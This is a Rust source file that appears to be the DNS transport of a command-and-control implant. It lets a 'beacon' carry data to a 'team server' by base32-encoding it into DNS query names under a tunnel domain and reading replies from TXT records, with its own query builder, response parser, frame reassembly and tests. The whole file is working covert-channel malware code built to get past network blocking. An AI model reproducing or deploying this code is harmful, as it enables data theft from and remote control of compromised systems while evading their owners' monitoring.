//! The DNS transport.
//!
//! When every other channel is blocked, the beacon can still talk to the
//! team server through DNS: it asks a resolver for a name that belongs to
//! the tunnel domain and the answer carries the next frame.
//!
//! The wire format is the same on both ends:
//!
//! ```text
//! query   <seq>.<chunk>.<agent>.<domain>
//! answer  TXT records, each one base32 of a slice of the frame
//! ```
//!
//! * `seq`    is the sequence number of the query, eight hex characters.
//! * `chunk`  is the base32 of the bytes the agent sends in this query.
//! * `agent`  is the base32 of the agent id.
//!
//! Both directions are length prefixed: a four byte big endian length in
//! front of every frame, so a chunk that ends in the middle of a frame is
//! reassembled instead of breaking the stream.

use std::io::{Read, Write};
use std::net::{SocketAddr, ToSocketAddrs, UdpSocket};
use std::time::Duration;

use crate::transport::Channel;

/// The number of payload bytes in one query label.
pub const CHUNK: usize = 32;

/// The DNS record type of the answers.
const TYPE_TXT: u16 = 16;

/// The DNS class of the answers.
const CLASS_IN: u16 = 1;

/// The label that stands for "no payload".  A DNS label cannot be empty, so
/// the queries that carry nothing need a placeholder.
const EMPTY_LABEL: &str = "-";

/// The alphabet of RFC 4648 base32.
const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

/// The DNS transport of the beacon.
pub struct DnsChannel {
    resolver: SocketAddr,
    domain: String,
    agent: String,
    /// The bytes that still have to go out.
    out: Vec<u8>,
    /// The bytes that came in and are not a frame yet.
    inbound: Vec<u8>,
    seq: u64,
    timeout: Duration,
}

impl DnsChannel {
    /// Create a channel that talks to `resolver` for `domain`.
    pub fn new(resolver: &str, domain: &str, agent_id: &str) -> Result<Self, String> {
        let addr: SocketAddr = resolver
            .to_socket_addrs()
            .map_err(|e| format!("dns: resolve {resolver}: {e}"))?
            .next()
            .ok_or_else(|| format!("dns: {resolver} has no address"))?;
        Ok(DnsChannel {
            resolver: addr,
            domain: domain.trim_end_matches('.').to_ascii_lowercase(),
            agent: base32_encode(agent_id.as_bytes()),
            out: Vec::new(),
            inbound: Vec::new(),
            seq: 0,
            timeout: Duration::from_secs(10),
        })
    }

    /// The name of the next query.
    fn query_name(&self, chunk: &[u8]) -> String {
        let seq = format!("{:08x}", self.seq);
        let payload = if chunk.is_empty() {
            EMPTY_LABEL.to_string()
        } else {
            base32_encode(chunk)
        };
        format!("{}.{}.{}.{}", seq, payload, self.agent, self.domain)
    }

    /// Send one query and read the answer.
    fn poll(&mut self) -> Result<(), String> {
        let take = self.out.len().min(CHUNK);
        let chunk: Vec<u8> = self.out.drain(..take).collect();
        let name = self.query_name(&chunk);
        let query = build_query(self.seq as u16, &name);
        self.seq = self.seq.wrapping_add(1);

        let bind = if self.resolver.is_ipv6() { "[::]:0" } else { "0.0.0.0:0" };
        let socket = UdpSocket::bind(bind).map_err(|e| format!("dns: bind: {e}"))?;
        socket
            .set_read_timeout(Some(self.timeout))
            .map_err(|e| format!("dns: timeout: {e}"))?;
        socket
            .send_to(&query, self.resolver)
            .map_err(|e| format!("dns: send: {e}"))?;
        let mut buf = vec![0u8; 4096];
        let (n, _) = socket
            .recv_from(&mut buf)
            .map_err(|e| format!("dns: no answer: {e}"))?;
        for text in parse_txt(&buf[..n]) {
            if let Some(bytes) = base32_decode(&text) {
                self.inbound.extend_from_slice(&bytes);
            }
        }
        Ok(())
    }

    /// Take a complete frame out of the reassembly buffer.
    fn take_frame(&mut self) -> Option<Vec<u8>> {
        if self.inbound.len() < 4 {
            return None;
        }
        let size = u32::from_be_bytes([
            self.inbound[0],
            self.inbound[1],
            self.inbound[2],
            self.inbound[3],
        ]) as usize;
        if size == 0 || size > 8 * 1024 * 1024 {
            // The stream is broken: drop it instead of guessing.
            self.inbound.clear();
            return None;
        }
        if self.inbound.len() < 4 + size {
            return None;
        }
        let frame = self.inbound[4..4 + size].to_vec();
        self.inbound.drain(..4 + size);
        Some(frame)
    }
}

impl Channel for DnsChannel {
    fn write_frame(&mut self, frame: &[u8]) -> std::io::Result<()> {
        let len = frame.len() as u32;
        self.out.extend_from_slice(&len.to_be_bytes());
        self.out.extend_from_slice(frame);
        Ok(())
    }

    fn read_frame(&mut self) -> std::io::Result<Vec<u8>> {
        loop {
            if let Some(frame) = self.take_frame() {
                return Ok(frame);
            }
            if let Err(err) = self.poll() {
                return Err(std::io::Error::new(std::io::ErrorKind::Other, err));
            }
            // The tunnel is a poll loop: the answer may carry nothing yet.
            std::thread::sleep(Duration::from_millis(200));
        }
    }

    fn close(&mut self) {
        self.out.clear();
        self.inbound.clear();
    }
}

/// Build a DNS query for one name.
fn build_query(id: u16, name: &str) -> Vec<u8> {
    let mut out = Vec::with_capacity(64);
    out.extend_from_slice(&id.to_be_bytes());
    // RD=1, everything else zero.
    out.extend_from_slice(&0x0100u16.to_be_bytes());
    out.extend_from_slice(&1u16.to_be_bytes()); // QDCOUNT
    out.extend_from_slice(&0u16.to_be_bytes()); // ANCOUNT
    out.extend_from_slice(&0u16.to_be_bytes()); // NSCOUNT
    out.extend_from_slice(&0u16.to_be_bytes()); // ARCOUNT
    for label in name.split('.') {
        if label.is_empty() {
            continue;
        }
        let bytes = label.as_bytes();
        let len = bytes.len().min(63);
        out.push(len as u8);
        out.extend_from_slice(&bytes[..len]);
    }
    out.push(0);
    out.extend_from_slice(&TYPE_TXT.to_be_bytes());
    out.extend_from_slice(&CLASS_IN.to_be_bytes());
    out
}

/// Skip a (possibly compressed) name and return the offset behind it.
fn skip_name(data: &[u8], mut offset: usize) -> usize {
    while offset < data.len() {
        let len = data[offset];
        if len == 0 {
            return offset + 1;
        }
        if len & 0xC0 == 0xC0 {
            return offset + 2;
        }
        offset += 1 + len as usize;
    }
    offset
}

/// Read the TXT records of an answer.
fn parse_txt(data: &[u8]) -> Vec<String> {
    let mut out = Vec::new();
    if data.len() < 12 {
        return out;
    }
    let questions = u16::from_be_bytes([data[4], data[5]]) as usize;
    let answers = u16::from_be_bytes([data[6], data[7]]) as usize;
    let mut offset = 12usize;
    for _ in 0..questions {
        offset = skip_name(data, offset);
        offset += 4;
        if offset > data.len() {
            return out;
        }
    }
    for _ in 0..answers {
        offset = skip_name(data, offset);
        if offset + 10 > data.len() {
            break;
        }
        let rtype = u16::from_be_bytes([data[offset], data[offset + 1]]);
        let rdlength = u16::from_be_bytes([data[offset + 8], data[offset + 9]]) as usize;
        offset += 10;
        if offset + rdlength > data.len() {
            break;
        }
        if rtype == TYPE_TXT {
            let rdata = &data[offset..offset + rdlength];
            if !rdata.is_empty() {
                let len = rdata[0] as usize;
                if len + 1 <= rdata.len() {
                    out.push(String::from_utf8_lossy(&rdata[1..1 + len]).to_string());
                }
            }
        }
        offset += rdlength;
    }
    out
}

/// Encode bytes as base32 (RFC 4648, no padding).
fn base32_encode(data: &[u8]) -> String {
    let mut out = String::with_capacity(data.len().div_ceil(5) * 8);
    let mut acc: u32 = 0;
    let mut bits: u32 = 0;
    for &byte in data {
        acc = (acc << 8) | u32::from(byte);
        bits += 8;
        while bits >= 5 {
            let index = ((acc >> (bits - 5)) & 0x1F) as usize;
            out.push(ALPHABET[index] as char);
            bits -= 5;
            acc &= (1 << bits) - 1;
        }
    }
    if bits > 0 {
        let index = ((acc << (5 - bits)) & 0x1F) as usize;
        out.push(ALPHABET[index] as char);
    }
    out
}

/// Decode a base32 string (RFC 4648, padding optional).
fn base32_decode(text: &str) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(text.len() * 5 / 8);
    let mut acc: u32 = 0;
    let mut bits: u32 = 0;
    for ch in text.chars() {
        if ch == '=' {
            continue;
        }
        let upper = ch.to_ascii_uppercase() as u8;
        let value = ALPHABET.iter().position(|c| *c == upper)? as u32;
        acc = (acc << 5) | value;
        bits += 5;
        if bits >= 8 {
            out.push(((acc >> (bits - 8)) & 0xFF) as u8);
            bits -= 8;
            acc &= (1 << bits) - 1;
        }
    }
    Some(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn base32_round_trips() {
        for len in 0..40usize {
            let data: Vec<u8> = (0..len).map(|i| (i * 7 + 3) as u8).collect();
            let text = base32_encode(&data);
            assert!(text.len() <= 63, "a label must stay short: {text}");
            assert_eq!(base32_decode(&text).unwrap(), data);
        }
    }

    #[test]
    fn base32_matches_the_reference_values() {
        assert_eq!(base32_encode(b""), "");
        assert_eq!(base32_encode(b"f"), "MY");
        assert_eq!(base32_encode(b"fo"), "MZXQ");
        assert_eq!(base32_encode(b"foobar"), "MZXW6YTBOI");
    }

    #[test]
    fn the_query_carries_the_name() {
        let query = build_query(1, "00000001.mzxw6ytboi.myagent.umbra.local");
        assert_eq!(&query[0..2], &[0x00, 0x01]);
        assert_eq!(u16::from_be_bytes([query[4], query[5]]), 1);
        assert!(query.windows(4).any(|w| w == b"myag"));
    }

    #[test]
    fn a_frame_is_split_and_reassembled() {
        let mut channel = DnsChannel {
            resolver: "127.0.0.1:53".parse().unwrap(),
            domain: "umbra.local".to_string(),
            agent: base32_encode(b"agent"),
            out: Vec::new(),
            inbound: Vec::new(),
            seq: 0,
            timeout: Duration::from_secs(1),
        };
        channel.write_frame(b"hello").unwrap();
        assert_eq!(channel.out.len(), 9);
        // The reassembly buffer is empty until the answer arrives.
        assert!(channel.take_frame().is_none());
        channel.inbound.extend_from_slice(&channel.out.clone());
        assert_eq!(channel.take_frame().unwrap(), b"hello".to_vec());
    }
}
